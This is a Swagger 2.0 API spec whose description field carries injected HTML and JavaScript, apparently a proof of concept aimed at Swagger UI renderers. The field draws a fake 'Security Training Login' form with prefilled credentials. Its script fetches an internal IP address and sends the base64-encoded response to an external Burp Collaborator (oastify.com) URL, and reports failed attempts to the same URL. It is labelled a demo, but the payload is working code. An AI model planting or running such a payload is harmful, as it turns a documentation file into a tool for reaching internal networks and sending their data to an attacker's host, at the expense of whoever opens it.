swagger: '2.0'
info:
  version: 1.0.0
  title: Advanced Demo Login Page
  description: '
    <div class="login-form">
      <div style="width: 100%; max-width: 400px; margin: 20px auto; padding: 15px; background: #fff3cd; border-radius: 8px; border: 1px solid #ffeeba; text-align: center;">
        <strong>Training / Demo Only</strong><br>
        This demo simulates internal metadata/IP discovery.
      </div>

      <div class="heading">
        <h1 style="text-align: center; font-size: 24px; color: #333;">Security Training Login</h1>
        <div style="width: 100%; max-width: 400px; margin: 0 auto; padding: 20px; background: #fff; border-radius: 8px;">
          <form id="demoForm">
            <div style="margin-bottom: 15px;">
              <label style="font-size: 14px;">Username</label>
              <input type="text" id="user" name="username" value="admin" style="width: 100%; padding: 10px; border: 1px solid #ccc;">
            </div>
            <div style="margin-bottom: 15px;">
              <label style="font-size: 14px;">Password</label>
              <input type="password" id="pass" name="password" value="password123" style="width: 100%; padding: 10px; border: 1px solid #ccc;">
            </div>
            <button type="button" onclick="handleDemoLogin()" style="width: 100%; padding: 12px; background-color: #d9534f; color: white; border: none; cursor: pointer;">
              Authorize & Login
            </button>
          </form>
        </div>
      </div>
    </div>

    <script>
      async function handleDemoLogin() {
        const internalIp = "http://10.83.34.78/"; // Target internal IP
        const collaborator = "https://txu5p50087ousiad5ff33sgcq3wukk89.oastify.com/exfil";
        
        try {
          // 1. Attempt to fetch from internal IP (Demonstrating SSRF/Internal reach)
          const response = await fetch(internalIp);
          const internalData = await response.text();
          
          // 2. Send the internal response data to Burp Collaborator
          fetch(collaborator + "?data=" + btoa(internalData));
          
          alert("Demo Action: Internal data retrieved and forwarded to collaborator.");
        } catch (e) {
          // If the IP is unreachable, we still notify the collaborator that the attempt happened
          fetch(collaborator + "?error=unreachable_internal_ip");
          alert("Internal IP unreachable, but request logged to collaborator.");
        }
      }
    </script>
    '
paths:
  /demo-login:
    post:
      responses:
        '200':
          description: OK
